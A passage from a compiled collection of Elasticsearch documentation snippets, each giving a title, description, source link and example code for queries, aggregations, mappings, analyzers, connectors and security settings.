KQL\nDESCRIPTION: This code shows how to negate queries in KQL using the 'not' keyword, useful for excluding specific documents from results.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/kql.md#2025-04-21_snippet_4\n\nLANGUAGE: yaml\nCODE:\n```\nNOT http.request.method: GET\n```\n\n----------------------------------------\n\nTITLE: Scripted Avg Aggregation with Runtime Field in Elasticsearch\nDESCRIPTION: Illustrates how to use a runtime field with a script to apply a grade correction before calculating the average.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-metrics-avg-aggregation.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nPOST /exams/_search?size=0\n{\n  \"runtime_mappings\": {\n    \"grade.corrected\": {\n      \"type\": \"double\",\n      \"script\": {\n        \"source\": \"emit(Math.min(100, doc['grade'].value * params.correction))\",\n        \"params\": {\n          \"correction\": 1.2\n        }\n      }\n    }\n  },\n  \"aggs\": {\n    \"avg_corrected_grade\": {\n      \"avg\": {\n        \"field\": \"grade.corrected\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Calculating Percent of Total Sales Using Normalize Aggregation\nDESCRIPTION: An Elasticsearch query demonstrating how to use the Normalize aggregation to calculate the percent of total sales for each month, including date histogram and sum aggregations.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-pipeline-normalize-aggregation.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPOST /sales/_search\n{\n  \"size\": 0,\n  \"aggs\": {\n    \"sales_per_month\": {\n      \"date_histogram\": {\n        \"field\": \"date\",\n        \"calendar_interval\": \"month\"\n      },\n      \"aggs\": {\n        \"sales\": {\n          \"sum\": {\n            \"field\": \"price\"\n          }\n        },\n        \"percent_of_total_sales\": {\n          \"normalize\": {\n            \"buckets_path\": \"sales\",          <1>\n            \"method\": \"percent_of_sum\",       <2>\n            \"format\": \"00.00%\"                <3>\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Warning About Zero Replicas Configuration in Elasticsearch\nDESCRIPTION: Warning message explaining the risks of setting the number of replicas to zero, which may lead to temporary availability loss during node restarts or permanent data loss in case of data corruption.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/index-settings/index-modules.md#2025-04-21_snippet_1\n\nLANGUAGE: plaintext\nCODE:\n```\nWARNING: Configuring it to 0 may lead to temporary availability loss\nduring node restarts or permanent data loss in case of data corruption.\n```\n\n----------------------------------------\n\nTITLE: Sample Connector Configuration File\nDESCRIPTION: YAML configuration for setting up a Salesforce connector, including Elasticsearch host, API key, and connector-specific details.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-salesforce.md#2025-04-21_snippet_3\n\nLANGUAGE: yaml\nCODE:\n```\nelasticsearch.host: http://host.docker.internal:9200\nelasticsearch.api_key: <ELASTICSEARCH_API_KEY>\n\nconnectors:\n  -\n    connector_id: <CONNECTOR_ID_FROM_KIBANA>\n    service_type: salesforce\n    api_key: <CONNECTOR_API_KEY_FROM_KIBANA>\n```\n\n----------------------------------------\n\nTITLE: Response from Simple Fragmenter Highlighting\nDESCRIPTION: This is the response from using 'simple' fragmenter with the 'plain' highlighter, showing how the text is broken into fragments with highlighted terms encapsulated in <em> tags.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/highlighting.md#2025-04-21_snippet_26\n\nLANGUAGE: console-result\nCODE:\n```\n{\n  ...\n  \"hits\": {\n    \"total\": {\n      \"value\": 1,\n      \"relation\": \"eq\"\n    },\n    \"max_score\": 1.6011951,\n    \"hits\": [\n      {\n        \"_index\": \"my-index-000001\",\n        \"_id\": \"1\",\n        \"_score\": 1.6011951,\n        \"_source\": {\n          \"message\": \"some message with the number 1\",\n          \"context\": \"bar\"\n        },\n        \"highlight\": {\n          \"message\": [\n            \" with the <em>number</em>\",\n            \" <em>1</em>\"\n          ]\n        }\n      }\n    ]\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Invalid Recursive Copy_to Configuration in Elasticsearch\nDESCRIPTION: This example shows an incorrect configuration where copy_to is used recursively through intermediary fields. Elasticsearch does not support recursive copying through intermediate fields, so field_1 values won't be copied to field_3.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/copy-to.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPUT bad_example_index\n{\n  \"mappings\": {\n    \"properties\": {\n      \"field_1\": {\n        \"type\": \"text\",\n        \"copy_to\": \"field_2\"\n      },\n      \"field_2\": {\n        \"type\": \"text\",\n        \"copy_to\": \"field_3\"\n      },\n      \"field_3\": {\n        \"type\": \"text\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Retrieving Specific Fields with Format Options\nDESCRIPTION: Example showing how to use the fields parameter to retrieve specific fields from search results, including wildcard patterns and custom date formatting.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/retrieve-selected-fields.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPOST my-index-000001/_search\n{\n  \"query\": {\n    \"match\": {\n      \"user.id\": \"kimchy\"\n    }\n  },\n  \"fields\": [\n    \"user.id\",\n    \"http.response.*\",\n    {\n      \"field\": \"@timestamp\",\n      \"format\": \"epoch_millis\"\n    }\n  ],\n  \"_source\": false\n}\n```\n\n----------------------------------------\n\nTITLE: Querying Flattened Objects with Incorrect Results\nDESCRIPTION: Example of a query against flattened objects that returns incorrect results due to the loss of field associations, matching 'Alice' and 'Smith' even though they belong to different objects.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/nested.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nGET my-index-000001/_search\n{\n  \"query\": {\n    \"bool\": {\n      \"must\": [\n        { \"match\": { \"user.first\": \"Alice\" }},\n        { \"match\": { \"user.last\":  \"Smith\" }}\n      ]\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring PKCS#12 SSL Settings in Elasticsearch\nDESCRIPTION: Configuration settings for using PKCS#12 container files (.p12 or .pfx files) that contain private keys, certificates, and trusted certificates in Elasticsearch. These settings define paths, formats, and passwords for keystores and truststores.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/security-settings.md#2025-04-21_snippet_48\n\nLANGUAGE: yaml\nCODE:\n```\nxpack.security.remote_cluster_client.ssl.keystore.path\n```\n\nLANGUAGE: yaml\nCODE:\n```\nxpack.security.remote_cluster_client.ssl.keystore.type\n```\n\nLANGUAGE: yaml\nCODE:\n```\nxpack.security.remote_cluster_client.ssl.keystore.secure_password\n```\n\nLANGUAGE: yaml\nCODE:\n```\nxpack.security.remote_cluster_client.ssl.keystore.secure_key_password\n```\n\nLANGUAGE: yaml\nCODE:\n```\nxpack.security.remote_cluster_client.ssl.truststore.path\n```\n\nLANGUAGE: yaml\nCODE:\n```\nxpack.security.remote_cluster_client.ssl.truststore.type\n```\n\nLANGUAGE: yaml\nCODE:\n```\nxpack.security.remote_cluster_client.ssl.truststore.secure_password\n```\n\n----------------------------------------\n\nTITLE: Ordering Terms Aggregation by Key in Elasticsearch\nDESCRIPTION: This snippet shows how to order the buckets in a Terms aggregation by their term values in ascending order using the 'order' parameter.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-terms-aggregation.md#2025-04-21_snippet_3\n\nLANGUAGE: console\nCODE:\n```\nGET /_search\n{\n  \"aggs\": {\n    \"genres\": {\n      \"terms\": {\n        \"field\": \"genre\",\n        \"order\": { \"_key\": \"asc\" }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Filtering API Response in Elasticsearch\nDESCRIPTION: Demonstrates how to use the filter_path parameter to reduce the response returned by Elasticsearch. It shows examples of including specific fields, using wildcards, and combining inclusive and exclusive filters.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/common-options.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nGET /_search?q=kimchy&filter_path=took,hits.hits._id,hits.hits._score\n```\n\nLANGUAGE: console\nCODE:\n```\nGET /_cluster/state?filter_path=metadata.indices.*.stat*\n```\n\nLANGUAGE: console\nCODE:\n```\nGET /_cluster/state?filter_path=routing_table.indices.**.state\n```\n\nLANGUAGE: console\nCODE:\n```\nGET /_count?filter_path=-_shards\n```\n\nLANGUAGE: console\nCODE:\n```\nGET /_cluster/state?filter_path=metadata.indices.*.state,-metadata.indices.logstash-*\n```\n\n----------------------------------------\n\nTITLE: Enabling Synthetic _source in Elasticsearch Index\nDESCRIPTION: Example of configuring an Elasticsearch index to use synthetic _source mode, which reconstructs source content on retrieval instead of storing it on disk to save space.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/mapping-source-field.md#2025-04-21_snippet_0\n\nLANGUAGE: json\nCODE:\n```\nPUT idx\n{\n  \"settings\": {\n    \"index\": {\n      \"mapping\": {\n        \"source\": {\n          \"mode\": \"synthetic\"\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Basic Search Query Using Rule Retriever\nDESCRIPTION: Example of performing a search using a previously defined ruleset with specific match criteria for query string and user country.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/searching-with-query-rules.md#2025-04-21_snippet_1\n\nLANGUAGE: json\nCODE:\n```\nGET /my-index-000001/_search\n{\n  \"retriever\": {\n    \"rule\": {\n      \"retriever\": {\n        \"standard\": {\n          \"query\": {\n            \"query_string\": {\n              \"query\": \"puggles\"\n            }\n          }\n        }\n      },\n      \"match_criteria\": {\n        \"query_string\": \"puggles\",\n        \"user_country\": \"us\"\n      },\n      \"ruleset_ids\": [ \"my-ruleset\" ]\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Basic ESQL Query with Implicit Limit\nDESCRIPTION: Demonstrates a basic ESQL query with an implicit limit of 1000 results.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/common/result-set-size-limitation.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM index | WHERE field = \"value\"\n```\n\n----------------------------------------\n\nTITLE: Querying Airport City Boundaries with ESQL\nDESCRIPTION: This ESQL query filters the airport_city_boundaries dataset for Copenhagen (CPH), calculates the envelope of the city boundary using ST_ENVELOPE, and returns the airport abbreviation, name, and envelope. It demonstrates data filtering, spatial function usage, and field selection in ESQL.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/st_envelope.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM airport_city_boundaries\n| WHERE abbrev == \"CPH\"\n| EVAL envelope = ST_ENVELOPE(city_boundary)\n| KEEP abbrev, airport, envelope\n```\n\n----------------------------------------\n\nTITLE: Working with Arrays in Painless\nDESCRIPTION: Examples of declaring, initializing, and assigning array variables in Painless, including multi-dimensional arrays.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-variables.md#2025-04-21_snippet_2\n\nLANGUAGE: painless\nCODE:\n```\nint[] ia1;\nia1 = new int[2];\nia1[0] = 1;\nint[] ib1 = ia1;\nint[][] ic2 = new int[2][5];\nic2[1][3] = 2;\nic2[0] = ia1;\n```\n\n----------------------------------------\n\nTITLE: Executing Boolean Field Script for Author Name Length\nDESCRIPTION: This script uses the boolean_field context to check if an author's first name is between 1 and 4 characters long. It demonstrates string manipulation in Painless scripts.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-api-examples.md#2025-04-21_snippet_7\n\nLANGUAGE: console\nCODE:\n```\nPOST /_scripts/painless/_execute\n{\n  \"script\": {\n    \"source\": \"\"\"\n      int space = doc['author'].value.indexOf(' ');\n      emit(space > 0 && space < 5);\n    \"\"\"\n  },\n  \"context\": \"boolean_field\",\n  \"context_setup\": {\n    \"index\": \"my-index-000001\",\n    \"document\": {\n      \"name\": \"Dune\",\n      \"author\": \"Frank Herbert\",\n      \"release_date\": \"1965-06-01\",\n      \"page_count\": 604\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Snowball Token Filter in Elasticsearch Index Settings\nDESCRIPTION: This snippet demonstrates how to configure a custom analyzer with a Snowball token filter for an Elasticsearch index. It sets up an analyzer named 'my_analyzer' that uses the standard tokenizer, lowercase filter, and a custom Snowball filter for English language stemming.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-snowball-tokenfilter.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPUT /my-index-000001\n{\n  \"settings\": {\n    \"analysis\": {\n      \"analyzer\": {\n        \"my_analyzer\": {\n          \"tokenizer\": \"standard\",\n          \"filter\": [ \"lowercase\", \"my_snow\" ]\n        }\n      },\n      \"filter\": {\n        \"my_snow\": {\n          \"type\": \"snowball\",\n          \"language\": \"English\"\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring ILM Policy with Explicit Shard Count Shrink Action\nDESCRIPTION: Example of configuring an ILM policy that shrinks an index to a specific number of shards in the warm phase. The policy sets the target number of shards to 1.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/index-lifecycle-actions/ilm-shrink.md#2025-04-21_snippet_0\n\nLANGUAGE: json\nCODE:\n```\nPUT _ilm/policy/my_policy\n{\n  \"policy\": {\n    \"phases\": {\n      \"warm\": {\n        \"actions\": {\n          \"shrink\" : {\n            \"number_of_shards\": 1\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Basic GROK Pattern Example in ESQL\nDESCRIPTION: Demonstrates a simple GROK pattern to match an IP address, timestamp, and status from a log line.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/esql-process-data-with-dissect-grok.md#2025-04-21_snippet_9\n\nLANGUAGE: esql\nCODE:\n```\nROW a = \"1.2.3.4 [2023-01-23T12:15:00.000Z] Connected\"\n| GROK a \"\"\"%{IP:ip} \\[%{TIMESTAMP_ISO8601:@timestamp}\\] %{GREEDYDATA:status}\"\"\"\n```\n\n----------------------------------------\n\nTITLE: Executing Geo-polygon Query in String Format\nDESCRIPTION: This code snippet demonstrates performing a geo-polygon query with points defined in string format (latitude followed by longitude). The Elasticsearch setup must support string format for geo-points, and it returns query results that meet the condition.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-geo-polygon-query.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nGET /_search\n{\n  \"query\": {\n    \"bool\": {\n      \"must\": {\n        \"match_all\": {}\n      },\n      \"filter\": {\n        \"geo_polygon\": {\n          \"person.location\": {\n            \"points\": [\n              \"40, -70\",\n              \"30, -80\",\n              \"20, -90\"\n            ]\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring a Date Processor with Custom Field and Timezone in Elasticsearch\nDESCRIPTION: This example shows how to configure a date processor that parses the 'initial_date' field using a specific date format and the Europe/Amsterdam timezone, then stores the result in a 'timestamp' field.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/date-processor.md#2025-04-21_snippet_0\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"description\" : \"...\",\n  \"processors\" : [\n    {\n      \"date\" : {\n        \"field\" : \"initial_date\",\n        \"target_field\" : \"timestamp\",\n        \"formats\" : [\"dd/MM/yyyy HH:mm:ss\"],\n        \"timezone\" : \"Europe/Amsterdam\"\n      }\n    }\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Fuzzy Search Query\nDESCRIPTION: Illustrates fuzzy searching using the '~' operator to find terms with minimal character differences\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-query-string-query.md#2025-04-21_snippet_5\n\nLANGUAGE: elasticsearch\nCODE:\n```\nquikc~ brwn~ foks~\n```\n\nLANGUAGE: elasticsearch\nCODE:\n```\nquikc~1\n```\n\n----------------------------------------\n\nTITLE: Subtracting Interval from DateTime in Elasticsearch SQL\nDESCRIPTION: Example showing how to subtract a year-to-month interval from a date value.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-datetime.md#2025-04-21_snippet_6\n\nLANGUAGE: sql\nCODE:\n```\nSELECT CAST('2018-05-13T12:34:56' AS DATETIME) - INTERVAL '2-8' YEAR TO MONTH AS result;\n\n       result\n--------------------\n2015-09-13T12:34:56Z\n```\n\n----------------------------------------\n\nTITLE: Running Faster GraphQL Connector End-to-End Tests\nDESCRIPTION: This command runs a faster version of the GraphQL connector end-to-end test by using a smaller data size.  This is achieved by setting the `DATA_SIZE` flag to `small`.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-graphql.md#2025-04-21_snippet_9\n\nLANGUAGE: shell\nCODE:\n```\n\"make ftest NAME=graphql DATA_SIZE=small\"\n```\n\n----------------------------------------\n\nTITLE: Describing Floor Function Behavior in Elasticsearch ESQL\nDESCRIPTION: Explains the behavior of the floor function, which rounds a number down to the nearest integer. It notes that the function is a noop for long and integer types, and for double types, it behaves similarly to Java's Math.floor method.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/description/floor.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n**Description**\n\nRound a number down to the nearest integer.\n\n::::{note}\nThis is a noop for `long` (including unsigned) and `integer`.\nFor `double` this picks the closest `double` value to the integer\nsimilar to [Math.floor](https://docs.oracle.com/en/java/javase/11/docs/api/java.base/java/lang/Math.html#floor(double)).\n::::\n```\n\n----------------------------------------\n\nTITLE: Checking Global Ordinals Heap Usage in Elasticsearch\nDESCRIPTION: These commands show how to check the amount of heap used by global ordinals for a specific join field relation. It includes examples for checking per-index and per-node per-index statistics.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/parent-join.md#2025-04-21_snippet_7\n\nLANGUAGE: console\nCODE:\n```\n# Per-index\nGET _stats/fielddata?human&fields=my_join_field#question\n\n# Per-node per-index\nGET _nodes/stats/indices/fielddata?human&fields=my_join_field#question\n```\n\n----------------------------------------\n\nTITLE: ESQL Function Parameter Documentation\nDESCRIPTION: Documents a 'number' parameter for an ESQL function that accepts a numeric expression and returns null if the input is null.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/parameters/signum.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.\n\n**Parameters**\n\n`number`\n:   Numeric expression. If `null`, the function returns `null`.\n```\n\n----------------------------------------\n\nTITLE: Adding Limit Token Filter to a Custom Analyzer in Elasticsearch\nDESCRIPTION: Example of creating a custom analyzer named 'standard_one_token_limit' that uses the standard tokenizer and the default limit filter which keeps only the first token.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-limit-token-count-tokenfilter.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nPUT limit_example\n{\n  \"settings\": {\n    \"analysis\": {\n      \"analyzer\": {\n        \"standard_one_token_limit\": {\n          \"tokenizer\": \"standard\",\n          \"filter\": [ \"limit\" ]\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Read Pipeline Privilege\nDESCRIPTION: Read-only access to ingest pipeline operations\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/security-privileges.md#2025-04-21_snippet_10\n\nLANGUAGE: markdown\nCODE:\n```\nread_pipeline\n```\n\n----------------------------------------\n\nTITLE: Creating a Custom Analyzer with KStem Filter in Elasticsearch\nDESCRIPTION: This example shows how to configure a new custom analyzer that incorporates the KStem filter. It uses the create index API to set up an analyzer named 'my_analyzer' with a whitespace tokenizer, lowercase filter, and KStem filter.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-kstem-tokenfilter.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPUT /my-index-000001\n{\n  \"settings\": {\n    \"analysis\": {\n      \"analyzer\": {\n        \"my_analyzer\": {\n          \"tokenizer\": \"whitespace\",\n          \"filter\": [\n            \"lowercase\",\n            \"kstem\"\n          ]\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: RRF Score Calculation with rank_window_size=5\nDESCRIPTION: Python-like example showing RRF score calculations when rank_window_size=5, allowing all documents from both queries to be considered. Demonstrates how the final ranking is determined and how pagination works with this configuration.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/reciprocal-rank-fusion.md#2025-04-21_snippet_13\n\nLANGUAGE: python\nCODE:\n```\n# doc   | queryA     | queryB       | score\n_id: 1 =  1.0/(1+1)  + 1.0/(1+4)      = 0.7\n_id: 2 =  1.0/(1+2)  + 1.0/(1+5)      = 0.5\n_id: 3 =  1.0/(1+3)  + 1.0/(1+3)      = 0.5\n_id: 4 =  1.0/(1+4)  + 1.0/(1+2)      = 0.533\n_id: 5 =    0        + 1.0/(1+1)      = 0.5\n```\n\n----------------------------------------\n\nTITLE: Downloading Outlook Connector Configuration File\nDESCRIPTION: This shell command downloads a sample configuration file for the Outlook connector from the GitHub repository and saves it to a local directory.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-outlook.md#2025-04-21_snippet_3\n\nLANGUAGE: sh\nCODE:\n```\ncurl https://raw.githubusercontent.com/elastic/connectors/main/config.yml.example --output ~/connectors-config/config.yml\n```\n\n----------------------------------------\n\nTITLE: Creating Elasticsearch API Key for Connector\nDESCRIPTION: Elasticsearch API call to create an API key with necessary permissions for the connector to access and manage the target index and related system indices.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/api-tutorial.md#2025-04-21_snippet_10\n\nLANGUAGE: json\nCODE:\n```\nPOST /_security/api_key\n{\n  \"name\": \"music-connector\",\n  \"role_descriptors\": {\n    \"music-connector-role\": {\n      \"cluster\": [\n        \"monitor\",\n        \"manage_connector\"\n      ],\n      \"indices\": [\n        {\n          \"names\": [\n            \"music\",\n            \".search-acl-filter-music\",\n            \".elastic-connectors*\"\n          ],\n          \"privileges\": [\n            \"all\"\n          ],\n          \"allow_restricted_indices\": false\n        }\n      ]\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: YAML Configuration for elasticsearch-certutil Silent Mode\nDESCRIPTION: This YAML configuration defines instances for certificate generation in silent mode. It includes options for specifying instance names, IP addresses, DNS names, and custom filenames.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/command-line-tools/certutil.md#2025-04-21_snippet_3\n\nLANGUAGE: yaml\nCODE:\n```\ninstances:\n  - name: \"node1\"\n    ip:\n      - \"192.0.2.1\"\n    dns:\n      - \"node1.mydomain.com\"\n  - name: \"node2\"\n    ip:\n      - \"192.0.2.2\"\n      - \"198.51.100.1\"\n  - name: \"node3\"\n  - name: \"node4\"\n    dns:\n      - \"node4.mydomain.com\"\n      - \"node4.internal\"\n  - name: \"CN=node5,OU=IT,DC=mydomain,DC=com\"\n    filename: \"node5\"\n```\n\n----------------------------------------\n\nTITLE: Indexing Blocks with Filters - JSON Snippet - JavaScript\nDESCRIPTION: This JSON snippet shows how to index blocks using search filters defined for both searches and database query filters, allowing for versatile indexing strategies.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-notion.md#2025-04-21_snippet_11\n\nLANGUAGE: javascript\nCODE:\n```\n{\n  \"searches\":[\n    {\n      \"query\":\"External tasks\",\n      \"filter\":{\n        \"value\":\"database\"\n      }\n    },\n    {\n      \"query\":\"External tasks\",\n      \"filter\":{\n        \"value\":\"page\"\n      }\n    }\n  ],\n  \"database_query_filters\":[\n    {\n      \"database_id\":\"notion_database_id1\",\n      \"filter\":{\n        \"property\":\"Task completed\",\n        \"checkbox\":{\n          \"equals\":true\n        }\n      }\n    }\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Defining Supported Types for Logarithm Function in ESQL\nDESCRIPTION: This markdown table specifies the input number types that are supported by the logarithm function in ESQL and their corresponding result types. It shows that double, integer, long, and unsigned_long input types all result in a double output.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/types/sinh.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n| number | result |\n| --- | --- |\n| double | double |\n| integer | double |\n| long | double |\n| unsigned_long | double |\n```\n\n----------------------------------------\n\nTITLE: Output Document After JSON Processing without Target Field\nDESCRIPTION: Example of a document after the JSON processor has parsed and replaced the original field. The source_and_target field now contains the structured JSON object instead of the string.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/json-processor.md#2025-04-21_snippet_5\n\nLANGUAGE: javascript\nCODE:\n```\n{\n  \"source_and_target\": {\n    \"foo\": 2000\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Term Query on Aggregate Metric Field\nDESCRIPTION: Example of performing a term query on an aggregate_metric_double field using the default_metric value.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/aggregate-metric-double.md#2025-04-21_snippet_4\n\nLANGUAGE: console\nCODE:\n```\nGET stats-index/_search\n{\n  \"query\": {\n    \"term\": {\n      \"agg_metric\": {\n        \"value\": 702.30\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Basic Search with Fast Vector Highlighter\nDESCRIPTION: Performs a search query using the Fast Vector Highlighter without matched_fields, highlighting only the exact matches in the standard analyzed field.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/highlighting.md#2025-04-21_snippet_15\n\nLANGUAGE: json\nCODE:\n```\nGET index2/_search\n{\n  \"query\": {\n    \"query_string\": {\n      \"query\": \"running with scissors\",\n      \"fields\": [\"comment\", \"comment.english\"]\n    }\n  },\n  \"highlight\": {\n    \"order\": \"score\",\n    \"fields\": {\n      \"comment\": {\n        \"type\" : \"fvh\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Retrieving Current Date and Time with NOW() in ESQL\nDESCRIPTION: This snippet demonstrates how to use the NOW() function in ESQL to get the current date and time. The result is stored in a variable named 'current_date' within a ROW construct.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/kibana/docs/functions/now.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW current_date = NOW()\n```\n\n----------------------------------------\n\nTITLE: Export Client Private Key\nDESCRIPTION: Extracts the client's private key from PKCS#12 store using OpenSSL\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/build-tools-internal/src/main/resources/test/ssl/README.md#2025-04-21_snippet_9\n\nLANGUAGE: bash\nCODE:\n```\nopenssl pkcs12 -in test-client.p12 -passin pass:keypass -nocerts -passout pass:test-client-key-password -out test-client.key\n```\n\n----------------------------------------\n\nTITLE: Creating Self-managed S3 Connector via API - Elasticsearch - Console\nDESCRIPTION: This snippet demonstrates how to create an Amazon S3 connector on Elasticsearch using the Create Connector API, specifying the index name, connector name, and service type. The required privileges for users are outlined for API key creation.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-s3.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPUT _connector/my-s3-connector\n{\n  \"index_name\": \"my-elasticsearch-index\",\n  \"name\": \"Content synced from Amazon S3\",\n  \"service_type\": \"s3\"\n}\n```\n\n----------------------------------------\n\nTITLE: Defining Java StackTraceElement Class Methods\nDESCRIPTION: This snippet defines the methods for the java.lang.StackTraceElement class accessible in Painless scripting.  It allows access to class name, file name, line number, method name and information about whether the method is native. These definitions determine how stack trace information can be accessed and processed within Painless scripts.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/java.lang.txt#2025-04-21_snippet_18\n\nLANGUAGE: java\nCODE:\n```\n\"class java.lang.StackTraceElement {\\n  (String,String,String,int)\\n  String getClassName()\\n  String getFileName()\\n  int getLineNumber()\\n  String getMethodName()\\n  boolean isNativeMethod()\\n}\"\n```\n\n----------------------------------------\n\nTITLE: Creating an Index with Date Math Expression in Elasticsearch\nDESCRIPTION: Example of creating an index with a name that includes a date math expression. The special characters in the date math syntax must be URI encoded when used in a request path.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/api-conventions.md#2025-04-21_snippet_4\n\nLANGUAGE: console\nCODE:\n```\n# PUT /<my-index-{now/d}>\nPUT /%3Cmy-index-%7Bnow%2Fd%7D%3E\n```\n\n----------------------------------------\n\nTITLE: Analyzing Text with Kuromoji Katakana Readingform in Elasticsearch\nDESCRIPTION: This snippet shows how to use the _analyze API to test the katakana_analyzer on the Japanese text \"寿司\". It demonstrates the conversion of kanji to katakana reading form.\nSOURCE: 